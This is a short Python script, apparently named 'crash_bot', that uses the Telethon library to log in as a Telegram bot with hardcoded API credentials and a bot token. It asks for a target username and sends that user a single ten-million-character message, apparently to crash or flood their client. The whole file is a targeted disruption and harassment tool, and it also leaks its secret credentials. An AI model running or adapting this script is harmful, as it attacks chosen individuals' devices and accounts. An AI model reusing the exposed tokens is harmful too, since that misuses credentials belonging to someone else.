from telethon import TelegramClient
import asyncio

api_id = 37131412
api_hash = 'b4d6fbf9fbe52b119320daeabb6ccd4'
bot_token = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'
session = 'crash_bot'

client = TelegramClient(session, api_id, api_hash)

async def main():
    await client.start(bot_token=bot_token)
    username = input('Введите юзернейм: ')
    user = await client.get_entity(username)
    await client.send_message(user, 'A' * 10_000_000)

asyncio.run(main())
